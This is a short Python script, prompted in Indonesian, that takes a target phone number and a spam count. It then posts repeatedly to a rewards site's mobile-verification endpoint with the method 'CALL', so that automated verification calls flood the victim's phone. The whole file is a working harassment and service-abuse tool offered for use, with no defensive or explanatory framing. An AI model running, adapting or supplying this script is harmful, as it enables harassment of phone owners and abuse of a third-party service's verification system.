#!/bin/python

import requests
from requests import post
import os
no = input("Masukan Nomor Target : ")
jumlah = int(input("Masukan Jumlah Spam : "))
url = 'https://id.jagreward.com/member/verify-mobile/'

ua = {
"Host": "id.jagreward.com",
"Connection": "keep-alive",
"User-Agent": "Mozilla/5.0 (Linux; Android 5.1; A1603) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
}
dat = {
"method": "CALL",
"countryCode": "id",
}

for x in range(jumlah):
	r = requests.post(url+no, headers=ua, data=dat)
	print(r.json()["message"])

